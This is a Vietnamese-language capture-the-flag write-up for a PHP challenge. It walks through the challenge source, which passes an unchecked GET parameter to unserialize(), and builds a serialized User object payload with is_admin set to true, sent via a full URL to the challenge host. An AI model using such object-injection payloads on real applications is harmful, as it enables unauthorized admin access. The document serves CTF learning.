# phpchallenge

```http://45.122.249.68:10001/```

Vào Challenge thì sẽ thấy ngay Source Code này:

```php
<?php
#include "config.php";
class User{
    private $name;
    private $is_admin = false;
    public function __construct($name){
        $this->$name = $name;
    }
    public function __destruct(){
        if($this->is_admin === true){
            echo "hi admin, here is your flag";
        }
    }
}
class Show_color{
    public $color;
    public $type;
    public function __construct($type,$color){
        $this->type = $type;
        $this->color = $color;
    }
     public function __destruct(){
         call_user_func($this->type->adu,$this->color);
     }
}
class do_nothing{
    public $why;
    public $i_use_this;
    public function __construct($a,$b){
        $this->why = $a;
        $this->i_use_this = $b;
    }
    public function __get($method){
        if(isset($this->why)){
            return $this->i_use_this;
        }
        return $method;
    }
}
if(isset($_GET['code'])){
    unserialize($_GET['code']);
}
else{
    highlight_file(__FILE__);
}
?>
```
Sau khi đọc từ trên xuống dưới thì có 2 cái mình focus đó là class User và đoạn if else cuối cùng còn mấy cái còn lại thì bỏ qua 1 bên

```php
class User{
    private $name;
    private $is_admin = false;
    public function __construct($name){
        $this->$name = $name;
    }
    public function __destruct(){
        if($this->is_admin === true){
            echo "hi admin, here is your flag";
        }
    }
}
```

Ở đây sẽ thấy hàm destruct sẽ trả về **"hi admin, here is your flag"** khi **is_admin===true** vậy chỉ cần làm cách nào đó đổi is_admin=1 (True) thì sẽ giải quyết được bài này

Chú ý thêm là $name $is_admin =false đều được đặt là **private**

```php
if(isset($_GET['code'])){
    unserialize($_GET['code']);
}
else{
    highlight_file(__FILE__);
}
```
Rồi tiếp theo tới đoạn này thì nhìn vào sẽ thấy $_GET['code'] 

GET ở đây có nghĩa là dùng phương thức GET trong PHP => code ở đây ta có thể truyền payload giống bằng cách URL/?code=...
Biến code ở đây cũng không bị kiểm tra nên việc truyền payload vào thì càng dễ dàng hơn

Vậy điều quan trọng ở đây sẽ phải truyền cái gì vào payload để có thể in ra cái mình cần thì ở đây để giải quyết vấn đề này mình sẽ dùng PHP serialization


Chúng ta cần đổi is_name=1 hoặc True vì thế sẽ phải khai thác class User để lấy payload cần truyền

```php
<?php 
  class User{
      private $name;
      private $is_admin = true;
      public function __construct($name){
          $this->$name = $name;
          var_dump($name);
      }
      public function __destruct(){
          if($this->is_admin === true){
              echo "hi admin, here is your flag";
          }
      }
  }
  $a=new User ("getfl4g");
  echo serialize($a);
?>  
```

Ở đây mình sẽ đổi $is_admin=true, tạo 1 biến a thuộc class User là getfl4g là tên nhóm của mình và cho echo ra serialize của biến a để lấy payload.

<img width="666" alt="Screen Shot 2021-10-19 at 23 57 21" src="https://user-images.githubusercontent.com/64759503/137957059-0acfff3a-3741-47f9-8c44-da5997858026.png">

Nhưng nếu sử dụng payload này ngay thì chưa được đâu, nhìn kĩ payload thì các biến đã bị đổi tên bằng cách thêm User vào phía trước như name -> Username, 
is_admin -> Useris_admin vì 2 biến được đặt ở private nên serialize sẽ mặc định như vậy. Nên phải đưa 2 biến này về đúng tên của nó 
 
```O:4:"User":3:{s:4:"name";N;s:8:"is_admin";b:1;s:7:"getfl4g";s:7:"getfl4g";} ```

Bây giờ truyền payload vào:

```http://45.122.249.68:10001/?code=O:4:"User":3:{s:4:"name";N;s:8:"is_admin";b:1;s:7:"getfl4g";s:7:"getfl4g";}```

<img width="1194" alt="Screen Shot 2021-10-20 at 00 04 22" src="https://user-images.githubusercontent.com/64759503/137958094-71571b3e-37b1-44eb-b21d-f52d6548f96a.png">

DONE!
